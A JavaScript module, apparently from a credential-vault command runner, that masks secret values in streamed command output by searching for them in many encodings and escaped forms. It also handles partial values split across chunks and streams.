/** base32 (RFC 4648 §6), padded and not, upper- and lower-case. */
function base32Forms(bytes) {
  let s = '', acc = 0, bits = 0;
  for (const b of bytes) { acc = ((acc << 8) | b) & 0xffff; bits += 8; while (bits >= 5) { s += B32[(acc >> (bits - 5)) & 31]; bits -= 5; } }
  if (bits) s += B32[(acc << (5 - bits)) & 31];
  const padded = s + '='.repeat((8 - (s.length % 8)) % 8);
  return [padded, s, padded.toLowerCase(), s.toLowerCase()].map((t) => ['base32', t]);
}
/**
 * THE FORMS — THE ONE LIST of what the scrubber knows (lane vault-scrub-forms, the desk's q-043 verify M1). A form is here
 * because a REAL tool prints it by itself; `producer` names one. `spelled` forms are texts formsOf builds from the value;
 * `read` forms are VIEWS (below): the output read with one family of escapes undone, every spelled form looked for in what
 * the view reads, the ORIGINAL span masked, its escapes included. What is NOT here, and why, is the header's ③.
 */
const FORM_ROWS = Object.freeze([
  ['raw', 'spelled', 'anything that prints what it was given: curl -v (> Authorization: Bearer …), an error echoing its input, an env dump'],
  ['base64', 'spelled', 'an HTTP Basic header (curl -v), a Kubernetes Secret (kubectl get secret -o yaml), a token inside a JSON body'],
  ['percent', 'spelled', 'a URL: its query, its userinfo (curl -v, git remote -v), a form body'],
  ['json', 'spelled', 'any JSON output: kubectl -o json, gh api, a JSON log line'],
  ['hex', 'spelled', 'a byte dump in a debug log; oathtool -v (Hex secret:)'],
  ['utf16', 'spelled', 'PowerShell 5\'s > and Out-File, reg export (UTF-16LE); Java\'s writeChars (UTF-16BE)'],
  ['base32', 'spelled', 'oathtool -v (Base32 secret:), an otpauth:// URI\'s secret='],
  ['qp', 'read', 'a mail body in quoted-printable (a fetched .eml, an IMAP FETCH): =XX for a byte, a soft line break =\\r\\n anywhere in the value'],
  ['escape', 'read', 'a language\'s repr of a value with a non-ASCII byte: Python b\'…\\xc3\\xbc…\' and \'…\\u00fc…\', Node util.inspect, Rust {:?} (\\u{…}), git and bash $\'…\' (octal)'],
  ['entity', 'read', 'an HTML page or an XML file showing the value: a template\'s escaping (&amp; &quot; &#x27; &#61;), a .NET or Maven config'],
  ['ansi', 'read', 'a terminal with colours: grep --color, git diff --color-words, a test runner\'s coloured diff — SGR escapes between the characters'],
  ['wrap', 'read', 'a wrapped line: a base64 mail body or openssl base64 output at 64 / 76 columns'],
].map(([form, how, producer]) => Object.freeze({ form, how, producer })));
const FORMS = Object.freeze(FORM_ROWS.map((r) => r.form));
/** A value → its SPELLED forms [{ form, text }] (distinct texts, the raw first). */
function formsOf(value) {
  const v = String(value == null ? '' : value), bytes = utf8(v);
  const all = [['raw', v],
    ...base64Forms(bytes),
    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes), ...utf16Forms(v), ...base32Forms(bytes)];
  const seen = new Set(), out = [];
  for (const [form, text] of all) if (text && !seen.has(text)) { seen.add(text); out.push(Object.freeze({ form, text })); }
  return out;
}
const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const NAMED_ENTITY = Object.freeze({ amp: '&', lt: '<', gt: '>', quot: '"', apos: '\'' });
const SIMPLE_ESCAPE = Object.freeze({ '\\': '\\', '\'': '\'', '"': '"', n: '\n', t: '\t', r: '\r' });
const textOf = (cp) => (cp >= 0 && cp <= 0x10ffff ? { text: String.fromCodePoint(cp) } : null);
/**
 * THE VIEWS — the `read` forms. A view's TOKEN is a short run that starts with one of its `triggers` (never found inside a
 * token) and stands for zero or more characters: `read(token)` → { byte } (joined with its neighbours as UTF-8, a byte that
 * is not UTF-8 read as Latin-1) | { text } ('' = dropped: a soft break, a colour) | null (not a token after all: read as it
 * is). `max` = the longest token, so a stream holds back an unfinished one; `pairs` = the trigger also escapes itself (`\\`),
 * so a run of triggers is read in pairs from its start and a stream holds back from the run's last pair boundary.
 */
const VIEWS = Object.freeze([
  { form: 'qp', triggers: '=', max: 3, re: /=(?:\r?\n|[0-9A-Fa-f]{2})/g, read: (t) => (t[1] === '\r' || t[1] === '\n' ? { text: '' } : { byte: parseInt(t.slice(1), 16) }) },
  { form: 'escape', triggers: '\\', max: 10, pairs: true, re: /\\(?:x[0-9A-Fa-f]{2}|[0-3][0-7]{2}|u\{[0-9A-Fa-f]{1,6}\}|u[0-9A-Fa-f]{4}|U[0-9A-Fa-f]{8}|[\\'"ntr])/g,
    read: (t) => (t[1] === 'x' ? { byte: parseInt(t.slice(2), 16) } : t[1] >= '0' && t[1] <= '3' ? { byte: parseInt(t.slice(1), 8) }
      : t[1] === 'u' && t[2] === '{' ? textOf(parseInt(t.slice(3, -1), 16)) : t[1] === 'u' ? { text: String.fromCharCode(parseInt(t.slice(2), 16)) }
        : t[1] === 'U' ? textOf(parseInt(t.slice(2), 16)) : { text: SIMPLE_ESCAPE[t[1]] }) },
  { form: 'entity', triggers: '&', max: 10, re: /&(?:#[0-9]{1,7};|#[xX][0-9A-Fa-f]{1,6};|amp;|lt;|gt;|quot;|apos;)/g,
    read: (t) => (t[1] !== '#' ? { text: NAMED_ENTITY[t.slice(1, -1)] } : textOf(t[2] === 'x' || t[2] === 'X' ? parseInt(t.slice(3, -1), 16) : parseInt(t.slice(2, -1), 10))) },
  { form: 'ansi', triggers: '\x1b', max: 35, re: /\x1b(?:\[[0-9;:?]{0,32}[mK]|[()][0-9A-Za-z])/g, read: () => ({ text: '' }) },
  { form: 'wrap', triggers: '\r\n', max: 1, re: /[\r\n]/g, read: () => ({ text: '' }) },
].map((v) => Object.freeze(v)));
const UTF8_NEED = (b) => (b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0);
/**
 * What view `vw` reads in buf[0, end) → null when no token is there (it reads what the plain text says), else { sk, at, to,
 * spans, end }: sk[i] stands for buf[at[i], to[i]); `spans` = [start, end) of every run a token-made character covers (a
 * stream never cuts inside one); `end` moves back over a trailing UTF-8 character still missing a byte (not `final`).
 */
function readView(vw, buf, end, final) {
  let sk = '', i = 0, any = false, m;
  const at = [], to = [], spans = [], bytes = [];
  const lit = (a, b) => { for (let k = a; k < b; k++) { sk += buf[k]; at.push(k); to.push(k + 1); } };
  const put = (text, a, b) => { for (let k = 0; k < text.length; k++) { sk += text[k]; at.push(a); to.push(b); } if (b - a > 1) spans.push(a, b); };
  const flush = () => {
    for (let k = 0; k < bytes.length;) {
      const [b, s] = bytes[k], need = UTF8_NEED(b);
      let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), j = k + 1;
      for (; need && j <= k + need && j < bytes.length; j++) { const c = bytes[j][0]; if (c < 0x80 || c > 0xbf) break; cp = (cp << 6) | (c & 0x3f); }
      const whole = need && j === k + need + 1 && cp >= [0, 0x80, 0x800, 0x10000][need] && cp <= 0x10ffff && !(cp >= 0xd800 && cp <= 0xdfff);
      if (whole) { put(String.fromCodePoint(cp), s, bytes[j - 1][2]); k = j; } else { put(String.fromCharCode(b), s, bytes[k][2]); k++; }
    }
    bytes.length = 0;
  };
  vw.re.lastIndex = 0;
  while ((m = vw.re.exec(buf)) !== null) {
    const s = m.index, e = s + m[0].length;
    if (e > end) break;
    const r = vw.read(m[0]);
    if (!r) continue;
    any = true;
    if (s > i) { flush(); lit(i, s); }
    if (r.byte != null) bytes.push([r.byte, s, e]);
    else if (r.text) { flush(); put(r.text, s, e); }
    else if (e - s > 1) spans.push(s, e);   // dropped (a soft break, a colour) — bytes on either side still join: =C3=\r\n=BC is one ü
    i = e;
  }
  if (!any) return null;
  if (!final && i === end && bytes.length) {   // a character still missing a byte at the end waits for the next chunk
    let k = bytes.length - 1;
    while (k > 0 && bytes[k][0] >= 0x80 && bytes[k][0] <= 0xbf) k--;
    if (UTF8_NEED(bytes[k][0]) > bytes.length - 1 - k) { end = bytes[k][1]; bytes.length = k; i = end; }
  }
  flush(); lit(i, end);
  return { sk, at, to, spans, end };
}
/**
 * A RUN's scrubber — ONE per run, fed by every stream of it (the desk's «one window per run»). `secrets` = [{ ref | label,
 * value }] — `ref` a parsed reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(stream, chunk) →
 * { <stream>: text }, end() → { <stream>: text }, hits, bytes (UTF-8 bytes of the spans it replaced — the audit's count),
 * byForm, window }.
 * WHAT IT READS: each stream's own text, and — while more than one stream has text kept back — the run's text in ARRIVAL
 * order, so a value split between stdout and stderr is seen whole AND a value inside one stream is never lost to the other's
 * chunks between its characters. A find masks its span on every stream it covers (each gets the placeholder).
 * WHAT IT KEEPS BACK: per stream, the last `window` (longest spelled form − 1) characters as every view reads them, a token
 * not finished yet, and the run's last `window` characters in arrival order; a find is handed on whole or kept back whole
 * (on every stream it covers) — an occurrence that starts before the kept text is whole in the buffer, one that starts
 * inside it waits for the next chunk (or `end`). One stream: chunked or whole, the output is the same (test-vault-run-model).
 * Hand it text from a streaming decoder (StringDecoder / TextDecoder { stream: true }) — never bytes cut mid-character.
 * A value under MIN_MASK_BYTES throws `entry_too_short_to_mask` (runVerdict refused it already).
 */
function createRunMasker(secrets, streams = ['out', 'err']) {
  const table = new Map();
  for (const s of Array.isArray(secrets) ? secrets : []) {
    const v = String(s && s.value != null ? s.value : '');
    if (bytesOf(v) < MIN_MASK_BYTES) { const e = new Error(WORDS.entry_too_short_to_mask); e.code = 'entry_too_short_to_mask'; throw e; }
    const ph = placeholderOf(s.ref && typeof s.ref === 'object' ? s.ref : s.label != null ? { label: s.label } : parseRef(String(s.ref)) || String(s.ref));
    for (const f of formsOf(v)) if (!table.has(f.text)) table.set(f.text, { ph, form: f.form });
  }
  const texts = [...table.keys()].sort((a, b) => b.length - a.length);
  const re = texts.length ? new RegExp(texts.map(reEscape).join('|'), 'g') : null;
  const maxLen = texts.length ? texts[0].length : 1;
  const W = maxLen - 1;
  const names = [...streams];
  let held = [];   // [[stream, text]] in arrival order — what the run has not handed on yet
  const st = { hits: 0, bytes: 0, byForm: {} };
  /** ONE text read plainly and through every view → { safe (what is decided), finds [{ s, e, ph, form }], spans [[s, e]] }. */
  function scan(buf, final) {
    const L = buf.length;
    let safe = final ? L : L - W;
    const views = [];
    for (const vw of VIEWS) {
      let end = L;
      if (!final) for (let k = Math.max(0, L - vw.max + 1); k < L; k++) if (vw.triggers.includes(buf[k])) {
        if (vw.pairs) { let j = k; while (j > 0 && buf[j - 1] === buf[k]) j--; k = j + 2 * Math.floor((k - j) / 2); }   // the last pair boundary of the run (a run is read in pairs from its start)
        end = k; break;
      }
      const r = readView(vw, buf, end, final);
      if (!final) { const len = r ? r.sk.length : end, ss = len - W; safe = Math.min(safe, ss <= 0 ? 0 : !r ? ss : ss < len ? r.at[ss] : r.end); }
      if (r) views.push([vw, r]);
    }
    safe = Math.max(0, safe);
    const finds = [], spans = [];
    const look = (sk, r, form) => {
      re.lastIndex = 0;
      let m;
      while ((m = re.exec(sk)) !== null) {
        const s = r ? r.at[m.index] : m.index;
        if (s >= safe) break;
        const t = table.get(m[0]);
        finds.push({ s, e: r ? r.to[m.index + m[0].length - 1] : m.index + m[0].length, ph: t.ph, form: form || t.form });
      }
    };
    look(buf, null, null);
    for (const [vw, r] of views) { look(r.sk, r, vw.form); for (let k = 0; k < r.spans.length; k += 2) spans.push([r.spans[k], r.spans[k + 1]]); }
    return { safe, finds, spans };
  }
  function step(final) {
    const out = {}; for (const k of names) out[k] = '';
    if (!held.length) return out;
    const own = new Map();   // stream → its kept-back text
    for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
    if (!re) { for (const [k, x] of own) out[k] += x; held = []; return out; }
    // GROUPS: a find (or one token / joined character a view read) → its range on each stream it covers, [a, b) in that
    // stream's own text — handed on whole, or kept back whole on every one of them
    const groups = [], cut = new Map();
    for (const [k, x] of own) {
      const sc = scan(x, final);
      cut.set(k, sc.safe);
      for (const f of sc.finds) groups.push({ r: [[k, f.s, f.e]], ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: [[k, a, b]], tok: true });
    }
    if (own.size > 1) {   // the run's text in arrival order: a value split between the pipes
      const all = held.map((x) => x[1]).join(''), streamAt = [], idxAt = [], seen = new Map();
      for (const [k, x] of held) for (let j = 0; j < x.length; j++) { const i = seen.get(k) || 0; streamAt.push(k); idxAt.push(i); seen.set(k, i + 1); }
      const rangesOf = (a, b) => { const m = new Map(); for (let i = a; i < b; i++) { const k = streamAt[i], x = m.get(k); if (x) x[2] = idxAt[i] + 1; else m.set(k, [k, idxAt[i], idxAt[i] + 1]); } return [...m.values()]; };
      const sc = scan(all, final);
      if (!final) { const n = new Map(); for (let i = 0; i < sc.safe; i++) n.set(streamAt[i], (n.get(streamAt[i]) || 0) + 1); for (const [k] of own) cut.set(k, Math.min(cut.get(k), n.get(k) || 0)); }
      for (const f of sc.finds) groups.push({ r: rangesOf(f.s, f.e), ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: rangesOf(a, b), tok: true });
    }
    if (!final) for (let moved = true; moved;) {   // never cut inside a group: one not wholly before the cuts is kept back whole
      moved = false;
      for (const g of groups) {
        if (g.r.every(([k, , b]) => b <= cut.get(k))) continue;
        for (const [k, a] of g.r) if (a < cut.get(k)) { cut.set(k, a); moved = true; }
      }
    }
    for (const [k, x] of own) {
      const c = cut.get(k);
      const masks = groups.filter((g) => !g.tok && g.r.every(([j, , b]) => b <= cut.get(j))).flatMap((g) => g.r.filter(([j]) => j === k).map(([, a, b]) => ({ a, b, ph: g.ph, form: g.form })));
      masks.sort((p, q) => p.a - q.a || q.b - p.b);
      let i = 0, last = null;
      for (const m of masks) {
        if (last && m.a < last.b) { if (m.b > last.b) { st.bytes += bytesOf(x.slice(last.b, m.b)); last.b = m.b; i = m.b; } continue; }   // overlapping finds: one placeholder
        out[k] += x.slice(i, m.a) + m.ph;
        st.hits++; st.bytes += bytesOf(x.slice(m.a, m.b)); st.byForm[m.form] = (st.byForm[m.form] || 0) + 1;
        last = { b: m.b }; i = m.b;
      }
      out[k] += x.slice(i, c);
    }
    const used = new Map(), next = [];
    for (const [k, x] of held) {
      const u = used.get(k) || 0, keep = x.slice(Math.max(0, cut.get(k) - u));
      used.set(k, u + x.length);
      if (keep) { const p = next[next.length - 1]; if (p && p[0] === k) p[1] += keep; else next.push([k, keep]); }
    }
    held = next;
    return out;
  }
  // round 21/23 (fb-93219e801a, «never drop a byte»): on a CUT (the 2 MiB bound / a timeout / a lock / the caller gone) the held tail
  // was DROPPED for good — a value begun near the end might be only half there, and flushed raw its half would leak. Now the CERTAIN
  // prefix is flushed with step(true) (every COMPLETE value masked), and ONLY the trailing run that could be a HALF value is replaced
  // with ONE placeholder: cutTailStart finds the earliest offset a value could be beginning and running off the end — a raw form half
  // present (base64/hex/percent/json/utf16/the raw value itself), a VIEW-decoded value half present (a complete-token decode whose tail
  // is a value prefix), or a trailing INCOMPLETE view token (a `&`/`\`/`=`/ESC run that may not have closed). A tail that is none of
  // these is flushed CLEAN and counts NO hit (round 23: the old code replaced the WHOLE held window — up to W, unbounded over blank
  // lines / colour codes — and counted a scrubbed hit where no value was). A normal end has no partial, so `cut` leaves it alone.
  const CUT_PH = placeholderOf({ label: '\u2026' });   // the cut tail's placeholder «[vault:\u2026]» — the uncertain trailing window, not any one value
  function cutTailStart(buf) {
    const L = buf.length;
    if (!L) return L;
    const isPrefix = (sfx) => { if (!sfx) return false; for (const t of texts) if (t.length > sfx.length && t.startsWith(sfx)) return true; return false; };   // a NON-EMPTY proper prefix of some spelled form
    const prefixStart = (str) => { const n = str.length; for (let q = Math.max(0, n - W); q < n; q++) if (isPrefix(str.slice(q))) return q; return n; };   // earliest offset whose suffix-to-the-end is a value prefix (W bounds the search)
    let start = prefixStart(buf);                                  // a raw / encoded form half present at the tail
    for (const vw of VIEWS) {
      for (let q = Math.max(0, L - vw.max + 1); q < L; q++) if (vw.triggers.includes(buf[q])) { if (q < start) start = q; break; }   // a trailing INCOMPLETE view token (its first trigger within the last vw.max-1 chars) — its decode is unknown ⇒ uncertain from there
      const r = readView(vw, buf, L, false);
      if (r) { const ps = prefixStart(r.sk); if (ps < r.sk.length) { const raw = r.at[ps]; if (raw != null && raw < start) start = raw; } }   // a complete-token VIEW decode whose tail is a value prefix — mapped back to a raw offset
    }
    return start;
  }
  function endStep(cut) {
    if (!cut || !re) return step(true);   // a COMPLETE stream (or no secrets): flush all, every complete match masked — no partial to fear
    const own = new Map(); for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
    const keepFrom = new Map(); for (const [k, x] of own) keepFrom.set(k, cutTailStart(x));
    held = [];
    for (const [k, x] of own) { const sIdx = keepFrom.get(k); if (sIdx > 0) held.push([k, x.slice(0, sIdx)]); }   // the CERTAIN prefix (no trailing partial) — step(true) masks its complete values and flushes the rest clean
    const out = step(true);
    for (const [k, x] of own) { const sIdx = keepFrom.get(k); if (sIdx < x.length) { out[k] = (out[k] || '') + CUT_PH; st.hits++; st.bytes += bytesOf(x.slice(sIdx)); } }   // ONLY the uncertain trailing window becomes a placeholder (and counts one hit); a clean tail adds nothing
    return out;
  }
  return {
    push(stream, chunk) {
      if (!names.includes(stream)) throw new TypeError(`no such stream: ${stream}`);
      const t = String(chunk == null ? '' : chunk);
      if (t) { const last = held[held.length - 1]; if (last && last[0] === stream) last[1] += t; else held.push([stream, t]); }
      return step(false);
    },
    end: (cut = false) => endStep(cut),
    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W, streams: names,
  };
}
/** ONE stream's scrubber (a whole text, the belt's): the run masker with one stream. → { push(chunk) → text, end() → text, hits, bytes, byForm, window }. */
function createMasker(secrets) {
  const m = createRunMasker(secrets, ['out']);
  return { push: (chunk) => m.push('out', chunk).out, end: (cut) => m.end(cut).out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
}
/** One whole text scrubbed (a card's command, a short output, the output belt's sink text). */
function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }

module.exports = {
  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TEMPLATE_CARD_MAX, urlHostsBad, parseCfgLine, cfgRouteHosts, repoHostOf, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, ownsAgentEntry, forHostOf, sameHost, ghCredEnvFor, isFreeEntry, refFor: refOf,
  INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf, targetOf, conninfoHosts, urlHosts, urlParse, configNestedFile,
  RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
  shapeOf, shapeKeyOf, destinationsOf, routeTargetsOf, sshTargetHost, readSshOpt, targetOf, urlParse, splitAuthority, normHost, SSH_OPT_TABLE, SSH_LOCAL_O, SSH_HOST_OPTS, cardFactsOf, CARD_STRING_MAX, ALWAYS_WHY, HOSTS_WHY, MASKING, CARD_SHAPES, WHY_AGAIN, CARD_FACTS_CODES, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, awayOf, runVerdict,
  FORMS, FORM_ROWS, VIEWS, formsOf, createMasker, createRunMasker, maskText,
};
